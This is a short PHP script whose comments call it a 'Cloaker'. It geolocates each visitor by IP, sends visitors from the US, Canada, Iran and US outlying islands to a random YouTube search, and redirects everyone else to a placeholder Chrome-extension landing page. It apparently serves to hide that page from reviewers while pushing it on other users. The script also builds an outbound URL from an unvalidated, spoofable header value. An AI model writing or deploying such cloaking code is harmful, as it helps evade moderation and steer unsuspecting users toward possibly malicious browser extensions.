<?php

/* # Enable Error Reporting and Display:
error_reporting(~0);
ini_set('display_errors', 1); */

/* # Output information about allow_url_fopen:
if( ini_get('allow_url_fopen') ) {
    echo '<p style="color: #0A0;">fopen is allowed on this host.</p>';
} else {
    echo '<p style="color: #A00;">fopen is not allowed on this host.</p>';
} */

# Getting IP:
$ip_address = '';

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']))
    $ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'];
else if (isset($_SERVER['HTTP_X_REAL_IP']))
    $ip_address = $_SERVER['HTTP_X_REAL_IP'];
else if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
else if (isset($_SERVER['HTTP_X_FORWARDED']))
    $ip_address = $_SERVER['HTTP_X_FORWARDED'];
else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ip_address = $_SERVER['HTTP_FORWARDED_FOR'];
else if (isset($_SERVER['HTTP_FORWARDED']))
    $ip_address = $_SERVER['HTTP_FORWARDED'];
else if (isset($_SERVER['REMOTE_ADDR']))
    $ip_address = $_SERVER['REMOTE_ADDR'];
else
    $ip_address = 'UNKNOWN';

# Cleaning IP:
$pos = strpos($ip_address, ':');
if ($pos !== false) {
    $ip_address = substr($ip_address, 0, $pos);
}

#if (!filter_var($ip_address, FILTER_VALIDATE_IP)) {
#    echo '<p style="color: #A00;">Invalid IP Address.</p>';
#}

// Requesting IP Data:
$json_data = file_get_contents("HTTP://GEO-IP-SERVER/json/{$ip_address}");
$obj = json_decode($json_data);

/* # Decide what to do based on return value:
if ($json_data === FALSE) {
    echo "Failed to open the URL ", htmlspecialchars($url);
} elseif ($json_data === NULL) {
    echo "Function is disabled.";
} else {
    echo $json_data;
} */

# Setting Cloaker:
if ($obj->country_code == "US" or $obj->country_code == "UM" or $obj->country_code == "IR" or $obj->country_code == "CA") {
    $rand = substr(md5(microtime()), rand(0, 26), 8);

    //header("HTTP/1.1 301 Moved Permanently");
    header("Location: https://www.youtube.com/results?search_query={$rand}", true, 302);
} else {
    header("Location: HTTP://CHROME-EXTENSION-LANDING/", true, 302);
}

exit();

# 'US' => 'United States'
# 'UM' => 'United States Outlying Islands'
# 'IE' => 'Ireland'
# 'CA' => 'Canada'
?>